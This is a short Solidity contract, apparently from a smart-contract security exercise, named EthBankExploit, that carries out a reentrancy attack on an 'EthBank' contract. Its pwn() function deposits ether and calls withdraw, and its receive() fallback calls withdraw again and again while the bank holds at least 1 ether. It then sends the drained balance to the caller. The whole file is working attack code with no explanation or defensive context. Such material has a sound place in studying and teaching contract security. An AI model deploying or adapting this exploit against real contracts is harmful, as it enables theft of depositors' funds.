// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IEthBank {
  function deposit() external payable;

  function withdraw() external payable;
}

contract EthBankExploit {
  IEthBank public bank;

  constructor(IEthBank _bank) {
    bank = _bank;
  }

  receive() external payable {
    if (address(bank).balance >= 1 ether) {
      bank.withdraw();
    }
  }

  function pwn() external payable {
    bank.deposit{ value: msg.value }();
    bank.withdraw();
    payable(msg.sender).transfer(address(this).balance);
  }
}
